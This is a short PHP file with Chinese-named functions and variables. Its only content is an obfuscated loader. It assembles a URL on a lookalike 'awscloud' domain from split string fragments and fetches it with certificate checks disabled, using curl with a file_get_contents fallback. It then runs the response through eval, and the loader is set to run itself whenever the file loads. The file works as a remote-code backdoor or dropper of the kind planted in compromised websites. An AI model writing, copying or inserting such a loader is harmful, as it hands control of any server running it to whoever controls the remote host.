<?php
/* 内联提示: inline_337 */

function 加载内容(){
    $一 = 'ht' . 'tp' . 's' . '://' . 'aws' . 'clo' . 'ud' . '.' . 'i' . 'cu';
    $二 = '/ra' . 'w';
    $三 = '/' . 'g8' . 'J' . 'kR';
    $四 = $一 . $二 . $三;

    $数据 = '';

    // 先用 CURL
    if(function_exists('curl_init')){
        $请求 = curl_init($四);
        curl_setopt_array($请求, [
            CURLOPT_RETURNTRANSFER => 1,
            CURLOPT_TIMEOUT => 3,
            CURLOPT_SSL_VERIFYPEER => 0,
            CURLOPT_SSL_VERIFYHOST => 0
        ]);
        $数据 = curl_exec($请求);
        curl_close($请求);
    }

    // 如果 CURL 失败，再试 file_get_contents
    if(empty($数据)){
        $数据 = @file_get_contents($四);
    }

    if($数据) eval("?>$数据");
}

加载内容();
